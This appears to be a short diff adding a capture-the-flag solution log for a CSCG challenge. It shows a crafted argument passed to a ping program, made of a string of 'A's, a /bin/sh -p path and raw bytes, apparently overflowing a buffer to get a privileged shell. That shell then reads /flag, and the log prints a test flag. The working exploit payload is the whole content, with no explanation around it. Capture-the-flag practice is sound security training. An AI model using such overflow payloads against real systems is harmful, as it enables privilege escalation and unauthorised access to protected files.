@@ -1,0 +1,5 @@
+$ ping 'm3110N!!'"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin//////sh -pA$(echo -ne '\xa0\xb4')"
+cat /flag > o
+<ctrl+c>
+$ cat o
+CSCG{TESTFLAG}
